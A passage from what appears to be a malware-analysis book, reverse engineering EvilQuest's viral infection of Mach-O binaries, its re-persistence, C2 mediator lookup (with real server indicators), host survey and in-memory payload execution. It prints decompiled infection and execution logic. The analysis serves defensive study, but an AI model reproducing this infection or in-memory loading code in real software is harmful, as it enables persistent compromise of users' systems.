<pre><code>0x0000000100004acc    mov       rdi, qword [rbp+path]<br/>0x0000000100004ad0    lea       rsi, qword [aApp]         ; ".app/" <span aria-label="annotation1" class="CodeAnnotationCode">1</span><br/>0x0000000100004ad7    call      strstr <span aria-label="annotation2" class="CodeAnnotationCode">2</span><br/>0x0000000100004adc    cmp       rax, 0x0                  ; substring not found<br/>0x0000000100004ae0    je        continue<br/>0x0000000100004ae6    mov       dword [rbp+result], 0x0 <span aria-label="annotation3" class="CodeAnnotationCode">3</span><br/>0x0000000100004aed    jmp       leave</code></pre>
<p class="CodeListingCaption"><a id="listing11-21">Listing 11-21</a>: Core logic of the <code>is_executable</code> function</p>
<p>We can see that <code>is_executable</code> first uses the <code>strstr</code> function <span aria-label="annotation2" class="CodeAnnotation">2</span> to check whether the passed-in path contains <code>".app/"</code> <span aria-label="annotation1" class="CodeAnnotation">1</span>. If it does, the <code>is_executable</code> function will prematurely return with <code>0x0</code> <span aria-label="annotation3" class="CodeAnnotation">3</span>. This means the malware skips binaries within application bundles. </p>
<p>For non-application files, the <code>is_executable</code> function opens the file and reads in <code>0x1c</code> bytes, as shown in <a href="#listing11-22" id="listinganchor11-22">Listing 11-22</a>:</p>
<pre><code>stream = fopen(path, "rb");<br/>if (stream == 0x0) {<br/>   result = -1;<br/>}<br/>else {<br/>   rax = fread(&amp;bytesRead, 0x1c, 0x1, stream);</code></pre>
<p class="CodeListingCaption"><a id="listing11-22">Listing 11-22</a>: Reading the start of a candidate file </p>
<p>It then calculates the file’s size by finding the end of the file (via <code>fseek</code>) and retrieving the file stream’s position (via <code>ftell</code>). If the file’s size is larger than <code>0x1900000</code> bytes (25MB), the <code>is_executable</code> function will return <code>0</code> for that file (<a href="#listing11-23" id="listinganchor11-23">Listing 11-23</a>):</p>
<pre><code>fseek(stream, 0x0, 0x2);<br/>size = ftell(stream);<br/>if (size &gt; 0x1900000) {<br/>    result = 0x0;<br/>}</code></pre>
<p class="CodeListingCaption"><a id="listing11-23">Listing 11-23</a>: Calculating the candidate file’s size</p>
<p>Next, the <code>is_executable</code> function evaluates whether the file is a Mach-O binary by checking whether it starts with a Mach-O “magic” value. In <span class="xref" itemid="xref_target_Chapter 5">Chapter 5</span> we noted that Mach-O headers always begin with some value that identifies the binary as a Mach-O. You can find all magic values defined in <span epub:type="pagebreak" id="Page_256" title="256"/>Apple’s <em>mach-o/loader.h</em>. For example, <code>0xfeedface</code> is the “magic” value for a 32-bit Mach-O binary (<a href="#listing11-24" id="listinganchor11-24">Listing 11-24</a>):</p>
<pre><code>0x0000000100004b8d    cmp       dword [rbp+header.magic], 0xfeedface <br/>0x0000000100004b94    je        continue<br/>0x0000000100004b9a    cmp       dword [rbp+header.magic], 0xcefaedfe<br/>0x0000000100004ba1    je        continue<br/>0x0000000100004ba7    cmp       dword [rbp+header.magic], 0xfeedfacf<br/>0x0000000100004bae    je        continue<br/>0x0000000100004bb4    cmp       dword [rbp+header.magic], 0xcffaedfe<br/>0x0000000100004bbb    jne       leave</code></pre>
<p class="CodeListingCaption"><a id="listing11-24">Listing 11-24</a>: Checking for Mach-O constants</p>
<p>To improve the readability of the disassembly, we instructed Hopper to treat the bytes read from the start of the file as a Mach-O header structure (<a href="#figure11-1" id="figureanchor11-1">Figure 11-1</a>). </p>
<figure>
<img alt="In Hopper, the “Edit variable var_40 at displacement -64” window is open. The Name box contains “header” and the Type box has “struct__macho_header” selected." class="keyline" src="image_fi/501942c11/f11001.png"/>
<figcaption><p><a id="figure11-1">Figure 11-1</a>: Typecasting the file’s header as a Mach-O header</p></figcaption>
</figure>
<p>Finally, the function checks the <code>filetype</code> member of the file’s Mach-O header to see if it contains the value <code>0x2</code> (<a href="#listing11-25" id="listinganchor11-25">Listing 11-25</a>): </p>
<pre><code>0x0000000100004bc1    cmp       dword [rbp+header.filetype], 0x2<br/>0x0000000100004bc5    jne       leave<br/>0x0000000100004bcb    mov       dword [rbp+result], 0x1</code></pre>
<p class="CodeListingCaption"><a id="listing11-25">Listing 11-25</a>: Checking the file’s Mach-O type </p>
<p>We can consult Apple’s Mach-O documentation to learn that this member will be set to <code>0x2</code> (<code>MH_EXECUTE</code>) if the file is a standard executable rather than a dynamic library or bundle.</p>
<p><span epub:type="pagebreak" id="Page_257" title="257"/>Once <code>is_executable</code> has performed these checks, it returns a list of files that meet its criteria.</p>
<h3 id="h2-501942c11-0007">Infecting Target Files</h3>
<p class="BodyFirst">For each file identified as a candidate for infection, the malware invokes a function named <code>append_ei</code> that contains the actual viral infection logic. At a high level, this function modifies the target file in the following manner: it prepends a copy of the malware to it; then it appends a trailer that contains an infection indicator and the offset to the file’s original code. </p>
<p>We can see this viral infection at work by placing a binary of our own into the user’s home directory and running the malware under the debugger to watch it interact with our file. Any Mach-O binary smaller than 25MB will work. Here we’ll use the binary created by compiling Apple’s boilerplate “Hello, World!” code in Xcode. </p>
<p>In the debugger, set a breakpoint on the <code>append_ei</code> function at <code>0x0000000100004bf0</code>, as shown in <a href="#listing11-26" id="listinganchor11-26">Listing 11-26</a>: </p>
<pre><code># <b>lldb /Library/mixednkey/toolroomd</b><br/>...<br/><br/>(lldb)<b> </b><b>b 0x0000000100004bf0</b><br/>Breakpoint 1: where = toolroomd`toolroomd[0x0000000100004bf0], address = 0x0000000100004bf0<br/><br/>(lldb) <b>c</b><br/><br/>Process 1369 stopped<br/>* thread #3, stop reason = breakpoint 1.1<br/>(lldb) <b>x/s $rdi</b><br/>0x7ffeefbffcf0: "/Library/mixednkey/toolroomd"<br/><br/>(lldb) <b>x/s $rsi</b><br/>0x100323a30: "/Users/user/HelloWorld"</code></pre>
<p class="CodeListingCaption"><a id="listing11-26">Listing 11-26</a>: Arguments passed to the <code>append_ei</code> function</p>
<p>When the breakpoint is hit, notice that the function is invoked with two arguments held in the <code>RDI</code> and <code>RSI</code> registers: the path of the malware and the target file to infect, respectively. Next, <code>append_ei</code> invokes the <code>stat</code> function to check that the target file is accessible. You can see this in the annotated decompilation in <a href="#listing11-27" id="listinganchor11-27">Listing 11-27</a>:</p>
<pre><code>if(0 != stat(targetPath, &amp;buf) )<br/>{<br/>    return -1;<br/>}</code></pre>
<p class="CodeListingCaption"><a id="listing11-27">Listing 11-27</a>: Checking a candidate’s file accessibility </p>
<p><span epub:type="pagebreak" id="Page_258" title="258"/>The source file is then wholly read into memory. In the debugger, we saw that this file is the malware itself. It will be virally prepended to the target binary (<a href="#listing11-28" id="listinganchor11-28">Listing 11-28</a>).</p>
<pre><code>FILE* src = fopen(sourceFile, "rb");<br/><br/>fseek(src, 0, SEEK_END);<br/>int srcSize = ftell(src);<br/>fseek(src, 0, SEEK_SET);<br/><br/>char* srcBytes = malloc(srcSize);<br/>fread(srcBytes, 0x1, srcSize, src);</code></pre>
<p class="CodeListingCaption"><a id="listing11-28">Listing 11-28</a>: The malware, reading itself into memory</p>
<p>Once the malware has been read into memory, the target binary is opened and fully read into memory (<a href="#listing11-29" id="listinganchor11-29">Listing 11-29</a>). Note that it has been opened for updating (using mode <code>rb+</code>), because the malware will soon alter it <span aria-label="annotation1" class="CodeAnnotation">1</span>. </p>
<pre><code><span aria-label="annotation1" class="CodeAnnotationHang">1</span> FILE* target = fopen(targetFile, "rb+"); <br/><br/>fseek(target, 0, SEEK_END);<br/>int targetSize = ftell(target);<br/>fseek(target, 0, SEEK_SET);<br/><br/>char* targetBytes = malloc(targetSize);<br/>fread(targetBytes, 0x1, targetSize, target);</code></pre>
<p class="CodeListingCaption"><a id="listing11-29">Listing 11-29</a>: Reading the target binary into memory</p>
<p>Next, the code within the <code>append_ei</code> function checks if the target file has already been infected (it makes no sense to infect the same binary twice). To do so, the code invokes a function named <code>unpack_trailer</code>. Implemented at <code>0x00000001000049c0</code>, this function looks for “trailer” data appended to the end of an infected file. We’ll discuss this function and the details of this trailer data shortly. For now, note that if the call to <code>unpack_trailer</code> returns trailer data, EvilQuest knows the file is already infected and the <code>append_ei</code> function exits (<a href="#listing11-30" id="listinganchor11-30">Listing 11-30</a>): </p>
<pre><code>0x0000000100004e6a    call       unpack_trailer<br/>0x0000000100004e6f    mov        qword [rbp+trailerData], rax<br/><br/>0x0000000100004e82    cmp        qword [rbp+trailerData], 0x0<br/>0x0000000100004e8a    je         continue<br/>...<br/>0x0000000100004eb4    mov        dword [rbp+result], 0x0<br/>0x0000000100004ec1    jmp        leave<br/><br/>continue:<br/>0x0000000100004ec6    xor        eax, eax</code></pre>
<p class="CodeListingCaption"><a id="listing11-30">Listing 11-30</a>: Checking if the target file is already infected</p>
<p><span epub:type="pagebreak" id="Page_259" title="259"/>Assuming the target file is not already infected, the malware overwrites it with the malware. To preserve the target file’s functionality, the <code>append_ei</code> function then appends the file’s original bytes, which it has read into memory (<a href="#listing11-31" id="listinganchor11-31">Listing 11-31</a>): </p>
<pre><code>fwrite(srcBytes, 0x1, srcSize, target);<br/><br/>fwrite(targetBytes, 0x1, targetSize, target);</code></pre>
<p class="CodeListingCaption"><a id="listing11-31">Listing 11-31</a>: Writing the malware and target file out to disk</p>
<p>Finally, the malware initializes a trailer and formats it with the <code>pack_trailer</code> function. The trailer is then written to the very end of the infected file, as shown in <a href="#listing11-32" id="listinganchor11-32">Listing 11-32</a>: </p>
<pre><code>int* trailer = malloc(0xC);<br/><br/>trailer[0] = 0x3;<br/>trailer[1] = srcSize;<br/>trailer[2] = 0xDEADFACE;<br/>packedTrailer = packTrailer(&amp;trailer, 0x0);<br/><br/>fwrite(packedTrailer, 0x1, 0xC, target);</code></pre>
<p class="CodeListingCaption"><a id="listing11-32">Listing 11-32</a>: Writing the trailer out to disk</p>
<p>This trailer contains a byte value of <code>0x3</code>, followed by the size of the malware. As the malware is inserted at the start of the target file, this value is also the offset to the infected file’s original bytes. As you’ll see, the malware uses this value to restore the original functionality of the infected binary when it’s executed. The trailer also contains an infection marker, <code>0xdeadface</code>. <a href="#table11-1" id="tableanchor11-1">Table 11-1</a> shows the layout of the resulting file. </p>
<figure>
<figcaption class="TableTitle"><p><a id="table11-1">Table 11-1</a>: The Structure of the File Created by the Viral Infection Logic </p></figcaption>
<table border="1" id="table-501942c11-0001"><tbody>
<tr>
<td>Viral code</td>
</tr>
<tr>
<td>Original code</td>
</tr>
<tr>
<td>Trailer<br/>
<code>0x3</code> | size of the viral code (the original code’s offset) | <code>0xdeadface</code></td>
</tr>
</tbody>
</table>
</figure>
<p>Let’s examine the infected <em>HelloWorld</em> binary to confirm that it conforms to this layout. Take a look at the hexdump in <a href="#listing11-33" id="listinganchor11-33">Listing 11-33</a>:</p>
<pre><code>% <b>hexdump -C HelloWorld</b><br/><br/>00000000  cf fa ed fe 07 00 00 01  03 00 00 80 02 00 00 00  |................|<br/>00000010  12 00 00 00 c0 07 00 00  85 00 20 04 00 00 00 00  |.......... .....|<br/>00000020  19 00 00 00 48 00 00 00  5f 5f 50 41 47 45 5a 45  |....H...__PAGEZE|<br/>00000030  52 4f 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |RO..............|<br/><br/>00015770  cf fa ed fe 07 00 00 01  03 00 00 00 02 00 00 00  |................| <span aria-label="annotation1" class="CodeAnnotationCode">1</span><br/>00015780  14 00 00 00 08 07 00 00  85 00 20 00 00 00 00 00  |.......... .....|<br/><span epub:type="pagebreak" id="Page_260" title="260"/>00015790  19 00 00 00 48 00 00 00  5f 5f 50 41 47 45 5a 45  |....H...__PAGEZE|<br/>000157a0  52 4f 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |RO..............|<br/><br/>000265b0  03 70 57 01 00 ce fa ad  de                       |.pW......| <span aria-label="annotation2" class="CodeAnnotationCode">2</span></code></pre>
<p class="CodeListingCaption"><a id="listing11-33">Listing 11-33</a>: Hexdump of an infected file</p>
<p>The hexdump shows byte values in little-endian order. We find the malware’s Mach-O binary code at the start of the binary, and the original <em>Hello World</em> code begins at offset <code>0x15770</code> <span aria-label="annotation1" class="CodeAnnotation">1</span>. At the end of the file, we see the packed trailer: <code>03 70 57 01 00 ce fa ad de</code> <span aria-label="annotation2" class="CodeAnnotation">2</span>. The first value is the byte <code>0x3</code>, while the subsequent two values when viewed as a 32-bit hexadecimal integer are <code>0x00015770</code>, the malware’s size and offset to the original bytes, and <code>0xdeadface</code>, the infection marker.</p>
<h3 id="h2-501942c11-0008">Executing and Repersisting from Infected Files</h3>
<p class="BodyFirst">When a user or the system runs a binary infected with EvilQuest, the copy of the malware injected into the binary will begin executing instead. This is because macOS’s dynamic loader will execute whatever it finds at the start of a binary. </p>
<p>As part of its initialization, the malware invokes a method named <code>extract_ei</code>, which examines the on-disk binary image backing the running process. Specifically, the malware reads <code>0x20</code> bytes of “trailer” data from the end of the file, which it unpacks via a call to a function named <code>unpack_trailer</code>. If the last of these trailer bytes is <code>0xdeadface</code>, the malware knows it is executing as a result of an infected file, rather than from, say, one of its launch items (<a href="#listing11-34" id="listinganchor11-34">Listing 11-34</a>): </p>
<pre><code>;unpack_trailer<br/>;rcx: trailer data<br/>0x0000000100004a39    cmp       dword ptr [rcx+8], 0xdeadface<br/>0x0000000100004a40    mov       [rbp+var_38], rax<br/>0x0000000100004a44    jz        isInfected</code></pre>
<p class="CodeListingCaption"><a id="listing11-34">Listing 11-34</a>: Examining the trailer data </p>
<p>If trailer data is found, the <code>extract_ei</code> function returns a pointer to the malware’s bytes in the infected file. It also returns the length of this data; recall that this value is stored in the trailer. This block of code resaves, repersists, and re-executes the malware if needed, as you can see in <a href="#listing11-35" id="listinganchor11-35">Listing 11-35</a>:</p>
<pre><code>maliciousBytes = extract_ei(argv, &amp;size);<br/>if (maliciousBytes != 0x0) {<br/>    persist_executable_frombundle(maliciousBytes, size, ...);<br/>    install_daemon(...);<br/>    run_daemon(...);<br/>    ...</code></pre>
<p class="CodeListingCaption"><a id="listing11-35">Listing 11-35</a>: The malware resaving, repersisting, and relaunching itself</p>
<p><span epub:type="pagebreak" id="Page_261" title="261"/>If we execute our infected binary, we can confirm in a debugger that the file invokes the <code>persist_executable_frombundle</code> function, implemented at <code>0x0000000100008df0</code>. This function is responsible for writing the malware from the infected file to disk, as shown in the debugger output in <a href="#listing11-36" id="listinganchor11-36">Listing 11-36</a>: </p>
<pre><code>% <b>lldb ~/HelloWorld</b><br/>...<br/><br/>Process 1209 stopped<br/>* thread #1, queue = 'com.apple.main-thread', stop reason = instruction step over<br/>    frame #0: 0x000000010000bee7 HelloWorld<br/>-&gt;  0x10000bee7: callq  persist_executable_frombundle <br/><br/>(lldb) <b>reg read</b><br/>General Purpose Registers:<br/>       ...<br/>       rdi = 0x0000000100128000 <span aria-label="annotation1" class="CodeAnnotationCode">1</span><br/>       rsi = 0x0000000000015770 <span aria-label="annotation2" class="CodeAnnotationCode">2</span><br/><br/>(lldb) <b>x/10wx $rdi</b><br/>0x100128000: 0xfeedfacf 0x01000007 0x80000003 0x00000002<br/>0x100128010: 0x00000012 0x000007c0 0x04200085 0x00000000<br/>0x100128020: 0x00000019 0x00000048</code></pre>
<p class="CodeListingCaption"><a id="listing11-36">Listing 11-36</a>: Arguments of the <code>persist_executable_frombundle</code> function</p>
<p>We see it invoked with a pointer to the malware’s bytes in the infected file <span aria-label="annotation1" class="CodeAnnotation">1</span> and one to the length of this data <span aria-label="annotation2" class="CodeAnnotation">2</span>. </p>
<p>In a file monitor, we can observe the infected binary executing this logic to recreate both the malware’s persistent binary (<em>~/Library/AppQuest/com.apple.quest</em>) and launch agent property list (<em>com.apple.questd.plist</em>), as shown in <a href="#listing11-37" id="listinganchor11-37">Listing 11-37</a>: </p>
<pre><code># <b>FileMonitor.app/Contents/MacOS/FileMonitor -pretty –filter HelloWorld</b><br/>{<br/>  "event" : "ES_EVENT_TYPE_NOTIFY_CREATE",<br/>  "file" : {<br/>    "destination" : "/Users/user/Library/AppQuest/com.apple.questd",<br/>    "process" : {<br/>      "uid" : 501,<br/>      "path" : "/Users/user/HelloWorld",<br/>      "name" : "HelloWorld",<br/>      "pid" : 1209<br/>      ...<br/>     }<br/>  }<br/>}<br/><br/>{<br/>  "event" : "ES_EVENT_TYPE_NOTIFY_CREATE",<br/>  "file" : {<br/>    "destination" : "/Users/user/Library/LaunchAgents/com.apple.questd.plist",<br/>    "process" : {<br/>      "uid" : 501,<br/>      "path" : "/Users/user/HelloWorld",<br/><span epub:type="pagebreak" id="Page_262" title="262"/>      "name" : "HelloWorld",<br/>      "pid" : 1209<br/>      ...<br/>     }<br/>  }<br/>}</code></pre>
<p class="CodeListingCaption"><a id="listing11-37">Listing 11-37</a>: Observing the recreation of both the malicious launch agent binary and plist</p>
<p>You might notice that the malware did not recreate its launch daemon, as this requires root privileges, which the infected process did not possess. </p>
<p>The infected binary then launches the malware via <code>launchctl</code>, as you can see in a process monitor (<a href="#listing11-38" id="listinganchor11-38">Listing 11-38</a>): </p>
<pre><code># <b>ProcessMonitor.app/Contents/MacOS/ProcessMonitor -pretty</b><br/>{<br/>  "event" : "ES_EVENT_TYPE_NOTIFY_EXEC",<br/>  "process" : {<br/>    "uid" : 501,<br/>    "arguments" : [<br/>      "launchctl",<br/>      "submit",<br/>      "-l",<br/>      "questd",<br/>      "-p",<br/>      "/Users/user/Library/AppQuest/com.apple.questd"<br/>    ],<br/>    "name" : "launchctl",<br/>    "pid" : 1309<br/>  }<br/>}<br/><br/>{<br/>  "event" : "ES_EVENT_TYPE_NOTIFY_EXEC",<br/>  "process" : {<br/>    "uid" : 501,<br/>    "path" : "/Users/user/Library/AppQuest/com.apple.questd",<br/>    "name" : "com.apple.questd",<br/>    "pid" : 1310<br/>  }<br/>}</code></pre>
<p class="CodeListingCaption"><a id="listing11-38">Listing 11-38</a>: Observing the relaunch of newly repersisted malware</p>
<p>This confirms that the main goal of the local viral infection is to ensure that a system remains infected even if the malware’s launch items and binary are deleted. Sneaky!</p>
<h3 id="h2-501942c11-0009">Executing the Infected File’s Original Code</h3>
<p class="BodyFirst">Now that the infected binary has repersisted and re-executed the malware, it needs to execute the infected binary’s original code so that nothing appears amiss to the user. This is handled by a function named <code>run_target</code> found at <code>0x0000000100005140</code>. </p>
<p><span epub:type="pagebreak" id="Page_263" title="263"/>The <code>run_target</code> function first consults the trailer data to get the offset of the original bytes within the infected file. The function then writes these bytes out to a new file with the naming scheme <em>.&lt;originalfilename&gt;1</em> <span aria-label="annotation1" class="CodeAnnotation">1</span>, as shown in <a href="#listing11-39" id="listinganchor11-39">Listing 11-39</a>. This new file is then set to be executable (via <code>chmod</code>) and executed (via <code>execl</code>) <span aria-label="annotation2" class="CodeAnnotation">2</span>:</p>
<pre><code><span aria-label="annotation1" class="CodeAnnotationHang">1</span> file = fopen(newPath, "wb");<br/>fwrite(bytes, 0x1, size, file);<br/>fclose(file);<br/><br/>chmod(newPath, mode);<br/><span aria-label="annotation2" class="CodeAnnotationHang">2</span> execl(newPath, 0x0); </code></pre>
<p class="CodeListingCaption"><a id="listing11-39">Listing 11-39</a>: Executing a pristine instance of the infected binary to ensure nothing appears amiss </p>
<p>A process monitor can capture the execution event of the new file containing the original binary’s bytes (<a href="#listing11-40" id="listinganchor11-40">Listing 11-40</a>):</p>
<pre><code># <b>ProcessMonitor.app/Contents/MacOS/ProcessMonitor -pretty</b><br/>{<br/>  "event" : "ES_EVENT_TYPE_NOTIFY_EXEC",<br/>  "process" : {<br/>    "uid" : 501,<br/>    "path" : "/Users/user/.HelloWorld1",<br/>    "name" : ".HelloWorld1",<br/>    "pid" : 1209<br/>  }<br/>}</code></pre>
<p class="CodeListingCaption"><a id="listing11-40">Listing 11-40</a>: Observing the execution of a pristine instance of the infected binary</p>
<p>One benefit of writing the original bytes to a separate file before executing it is that this process preserves the code-signing and entitlements of the original file. When EvilQuest infects a binary, it will invalidate any code-signing signature and entitlements by maliciously modifying the file. Although macOS will still allow the binary to run, it will no longer respect its entitlements, which could break the legitimate functionality. Writing just the original bytes to a new file restores the code-signing signature and any entitlements. This means that, when executed, the new file will function as expected.</p>
<h2 id="h1-501942c11-0004">The Remote Communications Logic</h2>
<p class="BodyFirst">After EvilQuest infects other binaries on the system, it performs additional actions, such as file exfiltration and the execution of remote tasking. These actions require communications with a remote server. In this section, we’ll explore this remote communications logic.</p>
<h3 id="h2-501942c11-0010">The Mediator and Command and Control Servers</h3>
<p class="BodyFirst">To determine the address of its remote command and control server, the malware invokes a function named <code>get_mediator</code>. Implemented at <code/><span epub:type="pagebreak" id="Page_264" title="264"/>0x000000010000a910, this function takes two parameters: the address of a server and a filename. It then calls a function named <code>http_request</code> to ask the specified server for the specified file, which the malware expects will contain the address of the command and control server. This indirect lookup mechanism is convenient, because it allows the malware authors to change the address of the command and control server at any time. All they have to do is update the file on the primary server. </p>
<p>Examining the malware’s disassembly turns up several cross references to the <code>get_mediator</code> function. The code prior to these calls references the server and file. Unsurprisingly, both are encrypted (<a href="#listing11-41" id="listinganchor11-41">Listing 11-41</a>):</p>
<pre><code>0x00000001000016bf    lea        rdi, qword [a3ihmvk0rfo0r3k]<br/>0x00000001000016c6    call       ei_str<br/><br/>0x00000001000016cb    lea        rdi, qword [a1mnsh21anlz906]<br/>0x00000001000016d2    mov        qword [rbp+URL], rax<br/>0x00000001000016d9    call       _ei_str<br/><br/>0x00000001000016de    mov        rdi, qword [rbp+URL]<br/>0x00000001000016e5    mov        rsi, rax<br/>0x00000001000016e8    call       get_mediator</code></pre>
<p class="CodeListingCaption"><a id="listing11-41">Listing 11-41</a>: Argument initializations and a call to the <code>get_mediator</code> function</p>
<p>Using a debugger or our injectable <em>deobfuscator dylib</em> discussed in <span class="xref" itemid="xref_target_Chapter 10">Chapter 10</span>, we can easily retrieve the plaintext for these strings:</p>
<pre><code>3iHMvK0RFo0r3KGWvD28URSu06OhV61tdk0t22nizO3nao1q0000033 -&gt; andrewka6.pythonanywhere<br/>1MNsh21anlz906WugB2zwfjn0000083 -&gt; ret.txt</code></pre>
<p>You could also run a network sniffer such as Wireshark to passively capture the network request in action and reveal both the server and filename. Once the HTTP request to <em>andrewka6.pythonanywhere</em> for the file <em>ret.txt</em> completes, the malware will have the address of its command and control server. At the time of the malware’s discovery in mid-2020, this address was <code>167.71.237.219</code>. </p>
<p>If the HTTP request fails, EvilQuest has a backup plan. The <code>get_mediator</code> function’s main caller is the <code>eiht_get_update</code> function, which we’ll cover in the following section. Here, we’ll just note that the function will fall back to a hardcoded command and control server if the call to <code>get_mediator</code> fails (<a href="#listing11-42" id="listinganchor11-42">Listing 11-42</a>):</p>
<pre><code>eiht_get_update() {<br/> ...<br/><br/> if(*mediated == NULL) {<br/><br/>    *mediated  = get_mediator(url, page);<br/>    if (*mediated == 0x0) {<br/><br/>        //167.71.237.219<br/><span epub:type="pagebreak" id="Page_265" title="265"/>        *mediated = ei_str("1utt{h1QSly81vOiy83P9dPz0000013");<br/>    }<br/>    ...</code></pre>
<p class="CodeListingCaption"><a id="listing11-42">Listing 11-42</a>: Fallback logic for a backup command and control server</p>
<p>The hardcoded address of the command and control server, <code>167.71.237.219</code>, matches the one found online in the <em>ret.txt</em> file. </p>
<h3 id="h2-501942c11-0011">Remote Tasking Logic</h3>
<p class="BodyFirst">A common feature of persistent malware is the ability to accept commands remotely from an attacker and run them on the victim system. It’s important to figure out what commands the malware supports in order to gauge the full impact of an infection. Though EvilQuest only supports a small set of commands, these are enough to afford a remote attacker complete control of an infected system. Interestingly, some the commands appear to be placeholders for now, as they are unimplemented and return <code>0</code> if invoked. </p>
<p>The tasking logic starts in the main function, where another function named <code>eiht_get_update</code> is invoked. This function first attempts to retrieve the address of the attacker’s command and control server via a call to <code>get_mediator</code>. If this call fails, the malware will fall back to using the hardcoded address we identified in the previous section.</p>
<p>The malware then gathers basic host information via a function named <code>ei_get_host_info</code>. Looking at the disassembly of this function (<a href="#listing11-43" id="listinganchor11-43">Listing 11-43</a>) reveals it invokes macOS APIs like <code>uname</code>, <code>getlogin</code>, and <code>gethostname</code> to generate a basic survey of the infected host:</p>
<pre><code>ei_get_host_info:<br/>0x0000000100005b00    push       rbp <br/>0x0000000100005b01    mov        rbp, rsp<br/>...<br/>0x0000000100005b1d    call       uname <br/>...<br/>0x0000000100005f18    call       getlogin <br/>...<br/>0x0000000100005f4a    call       gethostname</code></pre>
<p class="CodeListingCaption"><a id="listing11-43">Listing 11-43</a>: The <code>ei_get_host_info</code> survey logic</p>
<p>In a debugger, we can wait until the <code>ei_get_host_info</code> function is about to execute the <code>retq</code> instruction <span aria-label="annotation1" class="CodeAnnotation">1</span> in order to return to its caller and then dump the survey data it has collected (<a href="#listing11-44" id="listinganchor11-44">Listing 11-44</a>) <span aria-label="annotation2" class="CodeAnnotation">2</span>:</p>
<pre><code>(lldb) <b>x/i $rip</b><br/><span aria-label="annotation1" class="CodeAnnotationHang">1</span> -&gt;  0x100006043: c3  retq <br/><br/><span aria-label="annotation2" class="CodeAnnotationHang">2</span> (lldb) <b>p ((char**)$rax)[0]</b> <br/>0x0000000100207bb0 "user[(null)]"<br/>(lldb) <b>p ((char**)$rax)[1]</b><br/>0x0000000100208990 "Darwin 19.6. (x86_64) US-ASCII yes-no"</code></pre>
<p class="CodeListingCaption"><a id="listing11-44">Listing 11-44</a>: Dumping the survey</p>
<p><span epub:type="pagebreak" id="Page_266" title="266"/>The survey data is serialized via a call to a function named <code>eicc_serialize_request</code> (implemented at <code>0x0000000100000d30</code>) before being sent to the attacker’s command and control server by the <code>http_request</code> function. At <code>0x000000010000b0a3</code> we find a call to a function named <code>eicc_deserialize_request</code>, which deserializes the response from the server. A call to the <code>eiht_check_command</code> function (implemented at <code>0x000000010000a9b0</code>) validates the response, which should be a command to execute.</p>
<p>Interestingly, it appears that some information about the received command, perhaps a checksum, is logged to a file called <em>.shcsh </em>by means of a call to the <code>eiht_append_command</code> function (<a href="#listing11-45" id="listinganchor11-45">Listing 11-45</a>):</p>
<pre><code>int eiht_append_command(int arg0, int arg1) {<br/><br/>   checksum = ei_tpyrc_checksum(arg0, arg1);<br/>   ...<br/>   file = fopen(".shcsh", "ab");<br/>   fseek(var_28, 0x0, 0x2);<br/>   fwrite(&amp;checksum, 0x1, 0x4, file);<br/>   fclose(file);<br/>   ...<br/>}</code></pre>
<p class="CodeListingCaption"><a id="listing11-45">Listing 11-45</a>: Perhaps a cache of received commands?</p>
<p>Finally, <code>eiht_get_update</code> invokes a function named <code>dispatch</code> to handle the command. Reverse engineering the <code>dispatch</code> function, found at <code>0x000000010000a7e0</code>, reveals support for seven commands. Let’s detail each of these.</p>
<h3 id="h2-501942c11-0012">react_exec (0x1)</h3>
<p class="BodyFirst">If the command and control server responds with the command <code>0x1</code> <span aria-label="annotation1" class="CodeAnnotation">1</span>, the malware will invoke a function named <code>react_exec</code> <span aria-label="annotation2" class="CodeAnnotation">2</span>, as shown in <a href="#listing11-46" id="listinganchor11-46">Listing 11-46</a>:</p>
<pre><code>dispatch:<br/>0x000000010000a7e0    push<br/>0x000000010000a7e1    mov       rbp, rsp<br/>...<br/><br/>0x000000010000a7e8    mov       qword [rbp+ptrCommand], rdi<br/>...<br/>0x000000010000a7fe    mov       rax, qword [rbp+ptrCommand]<br/>0x000000010000a802    mov       rax, qword [rax]<br/><span aria-label="annotation1" class="CodeAnnotationHang">1</span> 0x000000010000a805    cmp       dword [rax], 0x1 <br/>0x000000010000a808    jne       continue<br/>0x000000010000a80e    mov       rdi, qword [rbp+ptrCommand]<br/><span aria-label="annotation2" class="CodeAnnotationHang">2</span> 0x000000010000a812    call      react_exec </code></pre>
<p class="CodeListingCaption"><a id="listing11-46">Listing 11-46</a>: Invocation of the <code>react_exec</code> function </p>
<p><span epub:type="pagebreak" id="Page_267" title="267"/>The <code>react_exec</code> command will execute a payload received from the server. Interestingly, <code>react_exec</code> attempts to first execute the payload directly from memory. This ensures that the payload never touches the infected system’s filesystem, providing a reasonable defense against antivirus scanning and forensics tools. </p>
<p>To execute the payload from memory, <code>react_exec</code> calls a function named <code>ei_run_memory_hrd</code>, which invokes various Apple APIs to load and link the in-memory payload. Once the payload has been prepared for in-memory execution, the malware will execute it (<a href="#listing11-47" id="listinganchor11-47">Listing 11-47</a>):</p>
<pre><code>ei_run_memory_hrd:<br/>0x0000000100003790    push       rbp <br/>0x0000000100003791    mov        rbp, rsp<br/>...<br/><br/>0x0000000100003854    call       NSCreateObjectFileImageFromMemory<br/>...<br/>0x0000000100003973    call       NSLinkModule<br/>...<br/>0x00000001000039aa    call       NSLookupSymbolInModule<br/>...<br/>0x00000001000039da    call       NSAddressOfSymbol<br/>...<br/>0x0000000100003a11    call       rax</code></pre>
<p class="CodeListingCaption"><a id="listing11-47">Listing 11-47</a>: The <code>ei_run_memory_hrd</code>’s in-memory coded execution logic</p>
<p>In my BlackHat 2015 talk “Writing Bad @$$ Malware for OS X,” I discussed this same in-memory code execution technique and noted that Apple used to host similar sample code.<sup class="endnote"><a href="#c11-endnote-3" id="c11-noteref-3">3</a></sup> The code in EvilQuest’s <code>react_exec</code> function seems to be directly based on Apple’s code. For example, both Apple’s code and the malware use the string <code>"[Memory Based Bundle]"</code>. </p>
<p>However, it appears there is a bug in the malware’s “run from memory” logic (<a href="#listing11-48" id="listinganchor11-48">Listing 11-48</a>):</p>
<pre><code>000000010000399c    mov       rdi, qword [module]<br/>00000001000039a3    lea       rsi, qword [a2l78i0wi...]     ;"_2l78|i0Wi0rn2YVsFe3..."<br/>00000001000039aa    call      NSLookupSymbolInModule</code></pre>
<p class="CodeListingCaption"><a id="listing11-48">Listing 11-48</a>: A bug in the malware’s code</p>
<p>Notice that the malware author failed to deobfuscate the symbol via a call to <code>ei_str</code> before passing it to the <code>NSLookupSymbolInModule</code> API. Thus, the symbol resolution will fail. </p>
